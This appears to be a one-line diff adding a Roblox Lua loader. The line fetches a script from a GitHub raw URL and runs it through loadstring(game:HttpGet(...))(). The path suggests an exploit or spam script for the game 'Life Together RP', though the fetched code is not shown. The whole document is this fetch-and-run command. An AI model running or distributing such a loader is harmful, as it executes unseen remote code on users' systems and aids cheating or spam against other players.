@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/lifetogether-rp-families-spam5-asj6swoko91qym.lua"))()
